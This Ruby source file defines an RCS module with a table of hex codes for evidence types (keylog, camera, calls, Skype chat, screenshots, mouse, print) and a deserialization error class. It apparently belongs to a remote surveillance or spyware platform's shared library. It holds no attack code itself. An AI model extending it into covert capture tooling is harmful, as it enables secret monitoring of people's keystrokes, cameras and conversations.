
require 'ffi'
require 'rcs-common/stringio'

module RCS

EVIDENCE_TYPES = { 0x0240 => :DEVICE,
                   0x0140 => :CALL,
                   0x0241 => :INFO,
                   0xB9B9 => :SNAPSHOT,
                   0x0040 => :KEYLOG,
                   0xE9E9 => :CAMERA,
                   0xC6C6 => :CHAT,
                   0x0300 => :CHATSKYPE,
                   0x0280 => :MOUSE,
                   0x0100 => :PRINT,}

class EvidenceDeserializeError < StandardError
  attr_reader :msg
  def initialize(msg)
    @msg = msg
  end

  def to_s
    @msg
  end
end

end # RCS::